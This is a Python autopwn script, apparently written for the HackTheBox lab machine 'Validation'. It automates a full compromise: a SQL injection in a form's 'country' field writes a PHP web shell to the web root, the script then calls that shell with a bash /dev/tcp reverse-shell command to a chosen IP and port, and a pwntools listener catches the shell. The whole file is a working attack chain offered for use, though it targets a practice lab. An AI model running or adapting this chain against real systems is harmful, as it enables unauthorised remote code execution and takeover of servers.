#!/usr/bin/env python3
# Autor: Juan García aka liandd
import sys
import signal
from termcolor import colored
import requests
import argparse
import threading
from pwn import *


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Validation", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://10.129.95.235)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


def upload_file(URL):
    data = {'username': 'blyat',
            'country': """Uruguay' union select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"-- -"""}

    r = requests.post(URL, data=data)


def intrusion(URL, IP, PORT):
    data = {
        'cmd': "/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' " % (IP, PORT)}

    r = requests.get(URL + "/shell.php", params=data)


def main():
    URL, IP, PORT = get_arguments()
    upload_file(URL)

    try:
        threading.Thread(target=intrusion, args=(URL, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
